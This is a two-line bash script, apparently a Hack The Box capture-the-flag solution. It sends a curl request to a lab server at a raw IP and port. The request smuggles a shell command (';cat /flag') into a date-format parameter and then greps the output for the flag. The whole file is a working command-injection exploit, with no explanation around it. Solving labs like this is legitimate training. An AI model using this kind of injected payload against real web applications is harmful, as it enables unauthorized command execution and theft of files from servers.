#!/bin/bash

curl "http://165.227.225.92:32449/?format=%H:%M:%S';cat /flag'" | grep 'HTB'
